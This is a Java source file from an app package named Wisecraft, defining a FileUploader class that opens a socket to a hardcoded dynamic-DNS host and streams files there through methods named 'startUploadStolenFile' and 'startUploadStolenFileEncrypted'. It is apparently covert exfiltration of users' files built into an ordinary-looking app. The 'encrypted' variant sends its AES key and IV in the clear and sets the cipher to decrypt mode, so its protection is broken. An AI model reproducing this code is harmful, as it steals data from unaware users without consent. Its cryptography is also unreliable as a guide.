package com.nao20010128nao.Wisecraft.misc;
import java.io.*;

import com.nao20010128nao.Wisecraft.Factories;
import java.net.Socket;
import java.security.SecureRandom;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class FileUploader {
	private static final String ENDPOINT = "nao20010128nao.dip.jp";
	private static final int ENDPOINT_PORT = 8083;
	public UUID uuid;
	SecureRandom sr=new SecureRandom();

	public FileUploader(UUID uuid) {
		this.uuid = uuid;
	}
	public FileUploader(String s) {
		this(UUID.fromString(s));
	}
	public OutputStream startUploadStolenFile(String filename) {
		try {
			Socket socket = new Socket(ENDPOINT, ENDPOINT_PORT);
			DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
			dos.writeByte(3);
			dos.writeUTF(uuid.toString());
			dos.writeUTF(filename);
			return socket.getOutputStream();
		} catch (IOException e) {
			// TODO 自動生成された catch ブロック
			DebugWriter.writeToE("FileUploader",e);
			return null;
		}
	}
	public OutputStream startUploadStolenFileEncrypted(String filename) {
		try {
			Socket socket = new Socket(ENDPOINT, ENDPOINT_PORT);
			DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
			dos.writeByte(5);
			{
				byte[] key=Factories.byteArray(16);
				byte[] iv=Factories.byteArray(16);
				sr.nextBytes(key);
				sr.nextBytes(iv);
				dos.write(key);
				dos.write(iv);
				try {
					Cipher ciph = Cipher.getInstance("AES/CBC/PKCS7Padding");
					ciph.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
							  new IvParameterSpec(iv));
					dos = new DataOutputStream(new CipherOutputStream(dos, ciph));
				} catch (Throwable e) {
					// TODO 自動生成された catch ブロック
					throw new IOException(e);
				}
			}
			dos.writeUTF(uuid.toString());
			dos.writeUTF(filename);
			return dos;
		} catch (IOException e) {
			// TODO 自動生成された catch ブロック
			DebugWriter.writeToE("FileUplaoder",e);
			return null;
		}
	}
}
